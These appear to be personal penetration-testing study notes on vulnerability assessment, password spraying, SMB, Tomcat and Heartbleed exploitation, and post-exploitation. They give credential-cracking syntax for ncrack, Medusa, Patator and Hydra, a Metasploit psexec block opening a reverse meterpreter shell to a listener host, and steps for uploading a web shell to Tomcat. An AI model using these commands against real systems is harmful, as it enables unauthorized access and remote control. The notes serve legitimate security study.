# Vulnerability Assessment and Exploitation
## Vulnerability Assessment
* The VA (Vulnerability Assessment) phase is aimed at building a list of vulnerabilities present on the target system.
* This is so that, attacker can have a list of vulnerabilities to try their exploit on and the bigger the list of vulnerabilities, the higher the chances of successful exploit.
* Vulnerabilties can be assessed from Enumeration phase, and there are also automated tools to do VA.
* Automated VA tools are usually scanners that send probes to the target system looking for well known vulnerabilities and subsequently delivers a report that the pentester can use during exploitation phase.
* Properly configuring the VA tools will help save time and also prevent the service from crashing when doing VA. However VA tools are noisy.

### Automated VA Tools
* Nessus
   * [Installing](https://www.tenable.com/blog/installing-and-using-nessus-on-kali-linux) Nessus on kali
   * register on nessus for an activation code
   * after downloading the appropriate nessus package from tenable run `dpkg -i Nessus-*`
   * Subsequently follow the instructions provided.
   
### Low Hanging Fruits
* Low Hanging Fruits (LHF) refers to Misconfigured or vulnerable Server, Unimplemented or Badly Implemented ACL, default or weak password, Open SMB shares / Null sessions, Broadcast Requests, etc.
* Some of the techniques to tackle LHF has already been discussed.

### Weak or Default Passwords
* Weak or default Passwords are still statistically speaking the weakest link.
* They can be exploited on common services like RDP, SMB, FTP, SQL etc.
* There is a technique called the **password-spray** or reverse brute-force attack where a small number of passwords (less than 2) are used in the password attack against a large number of users.
* Usernames can be gathered through SMTP enumeration or this [list](https://github.com/insidetrust/statistically-likely-usernames) 
#### Tools 
##### Password cracking over the Network
1. ncrack
   * network auth cracking tool that supports cracking of FTP, SSH, TELNET, HTTP(S), POP3, SMB, RDP and VNC.
   * By default ncrack does a password spray i.e iterates usernames for a fixed password
   * Default ncrack comes with its own password and username list.
   * **General Syntax** `ncrack <service>://<ip address/range>:<port number(optional)> -U <path to username file list> -P <path to password file list>`
   * **crack web address** `ncrack add <service>://<web address>:<port number(optional)>`
   * **Multiple addresses** `ncrack <service>://<ip address/range>:<port number(optional) <service2>://<ip address2/range2>:<port number2(optional)>` or `ncrack <ip addresses> -p <service>:<port>,<service2>:<port2>`
2. Medusa
   * Similar to ncrack but offers more services and options.
   * **General Synatx** `medusa -h <ip address> -M <service> -U <username list> -P <password list>`
   * **List all Modules(services)** `medusa -d`  
   * **To know more about a specific module** `medusa -M <service> -q`
3. Patator
   * Cumbersome syntax but highly customisable network password cracking tool.
   * **General Syntax** `patator <module> host=<ip address> user=<username> password=<password>`
   * **Advanced Syntax** `patator <module> host=FILE0 user=FILE1 password=FILE2 0=<host list path> 1=<username list path> 2=<password list path> -x ignore:mesg='<message to ignore>'`
      * In this advanced syntax, we specified host as `file0`, username as `file1` and password as `file2` which corresponds to 1,2,3 and `-x ignore:mesg=` means to inspect and ignore output with a certain message. 
4. EyeWitness
5. Hydra
   * Basic Usage `hydra -l <1 username>` -p <1 password> <ip address> <mode> -V -o <output path>`
   * Basic Usage 2 `hydra -L <path to username>` -P <path to passwordfile> <ip address> <mode> -V -o <output path>` 
##### Wordlist generator
1. Rsmangler
2. cewl

## Exploitation
* Armed with a vulnerability assessment report, it is time to test each vulnerability out.

### 3 Categories of Exploits
1. Client-side Exploit : require user interaction in order to be triggered (opening a link, .exe etc)
2. Remote Exploit : does not require user interaction and usually affects listening on the network
3. Local Privilege Escalation : attacker already has access to machine but is limited and hence need to gain higher privileges.

## Windows Exploitation 
### SMB Exploit
* Metasploit
   * Well establishing a shell is always easier using metasploit ~ ~ ~
   ```
   use exploit/windows/smb/psexec
   set RHOST <ip address>
   set SMBPass <password>
   set SMBUser <username>
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 172.16.10.5
   exploit
   ```
* NMAP
   * Making use of the `SMB_PSEXEC` and `script-args` module in nmap
* SMBCLIENT  
   * https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63

#### Eternal Blue
* Vulnerability that affected Microsoft SMBv1 implementation. The means in which SMBv1 hadles specially crafted packets results in remote code execution as NT Authority\System when exploited.
#### NTLM-SMB Relay 

## Metasploit Fun
### General Commands : 
* Searching for modules : `search <search term>`
* Selecting modules : `use <module path>`
* Getting more information about module : After selecting module, type `info`
* Show Module Options : `show options`
* Start exploit `exploit`
### Client Side Exploitation
### Remote Exploitation
#### Shellshock
* Affects webserver cgi files
  
#### Heartbleed
* critical OpenSSL vulnerability  
* nmap enumeration `nmap --script ssl-heartbleed <ip address>`
* metasploit to exploit
  ```
  msfconsole
  use auxiliary/scanner/ssl/openssl_heartbleed
  #do the required settings show options and show actions 
  run
  # results are stored in /root/.msf4/loot
  ```
#### Java RMI Regsitry
* are Java API service that invokes Java methods remotely and usually Found on port 1099
* enumerating services `nmap -sT -sV <ip address> -p1099 -v`
* metasploit 
  ```
  msfconsole
  use exploit/multi/misc/java_rmi_server
  #show options
  run
  ```
#### Java Deserialisation
* serialisation is the process of converting data into binary format so that it is easier to transfer over the network and save in disk. 
* to be exact, this vulnerability is on Java deserialisatin of untrusted data, where malicious data is serialised and sent to the java application and over the network and into the application where it is deserialised and processed by the application resulting in code execution like spawning a shell etc.  

#### Tomcat Exploit
* Tomcat is a FOSS web server used primarily for Java-based web applications.
* Its web interface is usually running on TCP port 8180.
* Possible weakness : 
   1. weak credentials/default credentials
* metasploit `auxiliary/scanner/http/tomcat_mgr_login` which simply attempts to login to a Tomcat Application Manager instance using a specific user/pass. 
* using hydra to bruteforce login
* subsequently, using `/usr/share/laudanum` uploading the `/jsp` directory upload `cmd.war` to gain web shell on the server.
* access shell by simply <ip address>:<port>/<path>  

# Post Exploitation
* Is the last step to take after exploitation before the cycle of `Live Host Enum --> Further DNS Enum --> OS Scanning --> Port Scanning --> Service Scanning --> Vulnerability Analysis --> Validation --> Exploit` repeats.
* Aim of Post Exploitation is to make sure exploit is :  
   * Stable
   * Privileged 
   * Persistent
* One issue with metepreter shell is that the exploited process can be killed and session is lost.

## Additional Information Gathering
* for this refer to Linux Attacks as well as Recon.

## Privilege Escalation
* is an attack that exploits OS or third party software vulnerabilities in order to elevate current accesss privileges to protected resources.
* Privilege escalation can be considered as Horizontal where attacker keeps the same set or same level of privilege, just assuming identity of a different user or it can be vertical where attacker is able to move from lower privilege user to higher privilege.

## Maintaining Access

## Pillaging
## Lateral Movement
## Data Exfiltration
## Tools
* Metasploit
   * Getting to know what commands can be run `?`, `run`
   * Getting information about system `sysinfo` 

